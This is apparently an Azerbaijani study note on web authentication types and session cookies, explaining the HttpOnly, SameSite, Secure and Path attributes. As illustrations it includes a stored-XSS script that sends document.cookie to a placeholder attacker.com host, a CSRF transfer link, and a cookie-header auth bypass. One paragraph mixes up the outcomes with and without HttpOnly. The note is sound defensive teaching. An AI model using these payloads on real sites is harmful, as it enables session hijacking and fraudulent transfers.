## AUTH Tipləri:
1) *Password-based* – Universitet portalına hər dəfə username və şifrə yazaraq daxil olursan.

2) *MFA* – Bank hesabına girişdə şifrəni yazırsan, sonra telefonuna gələn SMS kodu təsdiqləyirsən.

3) *Token-based* – Mobil tətbiqdə login edirsən, server sənə token verir və tətbiq hər sorğuda onu göndərir.

4) *Session-based* – Onlayn mağazaya login olandan sonra səhifələri dəyişsən də çıxış olmursan.

5) *Certificate-based* – İş yerinin daxili şəbəkəsinə yalnız sənə verilmiş sertifikatla qoşula bilirsən.

6) *Biometric* – Telefon kilidini üz tanıma ilə açırsan.

7) *SSO* – İş sisteminə bir dəfə login olub e-mail, HR və daxili portalı ayrıca girişsiz açırsan.

<img width="798" height="572" alt="image" src="https://github.com/user-attachments/assets/e758417b-6823-42ea-b4e9-6e78bd0c8246" />

#### CVE‑2020‑15906 – Tiki Wiki CMS‑də admin hesabı çox yalnış loginlə kilidləndikdən sonra boş şifrə ilə autentifikasiyanın ötürülməsinə imkan verən auth bypass zəifliyidir.

#### https://www.exploit-db.com/exploits/39167 - Bu exploitdə auth bypass ona görə baş verir ki, tətbiq login olub‑olmadığını server‑side yoxlamaq əvəzinə yalnız $_COOKIE['LoggedIn'] dəyişəninə inanır; hücumçu request‑ə Cookie: LoggedIn=yes əlavə etməklə heç bir username/password olmadan admin panelə daxil olur.

## Session, SessionID və Cookie
İstifadəçi login olduqda server backend‑də (məs: PHP, Java, Node) session object yaradır və onu server‑side storage‑da (RAM, Redis, DB) saxlayır; brauzerə isə yalnız SessionID göndərilir (cookie kimi). Hər HTTP request‑də server SessionID‑ni oxuyur, uyğun session‑u tapır və istifadəçinin rolunu, auth statusunu, CSRF tokenini, vaxtını və s. yoxlayır.
Yəni,

İstifadəçi uğurla login olduqda, server server‑side session yaradır, bu session üçün unikal və təsadüfi SessionID generasiya edir, session məlumatlarını (user_id, auth=true, role, expiry və s.) server‑də saxlayır və yalnız həmin SessionID‑ni cookie kimi brauzerə göndərir; brauzer bu cookie‑ni saxlayır və sonrakı hər HTTP request‑də avtomatik göndərdiyi üçün server SessionID‑yə əsasən istifadəçini tanıyır və yenidən login tələb etmir.

## HTTP-ONLY
*HttpOnly* – cookie atributudur; brauzerin JavaScript vasitəsilə həmin cookieni oxumasına mane olur, yalnız HTTP sorğularında (serverə göndərilərkən) istifadə olunur, bu da XSS hücumlarından cookie oğurlanmasının qarşısını alır.

Tutaq ki, sənin brauzerində session cookie var.Əgər HttpOnly YOXDURSA, saytda olan bir JavaScript bunu oxuya bilər:
document.cookie
→ hücumçu XSS ilə sessiyanı oğurlayar.

Əgər HttpOnly VARSA, JavaScript heç cür bu cookieni görə bilməz ❌

amma brauzer yenə də onu serverə avtomatik göndərir ✅

*Qısaca desək:*
HttpOnly = cookie yalnız server üçündür, JS üçün qadağandır.

*HttpOnly YOXDURSA*

Hücumçu stored XSS yerləşdirir:

```<script>
fetch("https://attacker.com/?c=" + document.cookie)
</script>
```

Admin/user səhifəni açır
Brauzer session cookie-ni JS-ə verir

*HttpOnly VARSA*

Eyni stored XSS işləyir

document.cookie → SESSION GÖRÜNMÜR

Hücumçu cookie-ni oğurlaya bilmir
Session təhlükəsiz qalır
Cookie hücumçuya gedir
Hücumçu session hijacking edir → login olmadan daxil olur

*DİQQƏT*: HttpOnly XSS-i bloklamır. Amma session oğurluğunu bloklayır

*Simulyasiya:*

HTTP = poçtalyon

JS = evin içindəki uşaq

HttpOnly = “poçtu poçtalyon versin, uşağa yox”

## SameSite

SameSite cookie atributudur və brauzerə deyir ki, bu cookie hansı hallarda HTTP request‑ə əlavə olunsun. Brauzer cookie‑ləri avtomatik göndərir.
Əgər istifadəçi bir sayta login olubsa, başqa sayt həmin istifadəçinin brauzeri vasitəsilə həmin sayta request göndərə bilər.

*Ssenari*

İstifadəçi bank.com‑da login olub
Brauzerdə session cookie var

```Cookie: SESSION=abc123```


Sonra istifadəçi başqa saytda belə link görür:

```
<a href="https://bank.com/transfer?to=attacker&amount=1000">
  Endirim üçün klik et
</a>
```
<a href="https://bank.com/transfer?to=attacker&amount=1000">
  Endirim üçün klik et
</a>

İstifadəçi klikləyir ✅

*Əgər SameSite YOXDURSA*

Brauzer SESSION=abc123 cookie‑sini bank.com‑a göndərir. Server istifadəçini login olmuş hesab edir. Pul köçürülür. Bu CSRF hücumudur.

*Əgər SameSite varsa*

Request başqa saytdan gəldiyi üçün brauzer cookie‑ni göndərmir.Əməliyyat icra olunmur ❌

*VACİB*: HttpOnly və SameSite request‑də görünməz, yalnız serverin Set‑Cookie response‑unda olur və brauzer bu qaydaları səssizcə tətbiq edir.

*Qısaca*: HttpOnly cookie-nin yalnız HTTP request-lərdə istifadə olunmasını (JS-dən gizlədilməsini), SameSite isə onun hansı HTTP request-lərə əlavə olunacağını müəyyən edir.

## Secure

Cookie yalnız HTTPS üzərindən göndərilir

HTTP-də GETMİR ❌
```
Set-Cookie: SESSION=abc123; Secure
```

## Path

Cookie yalnız müəyyən URL path-lərdə göndərilir

```
Set-Cookie: SESSION=abc123; Path=/admin
```

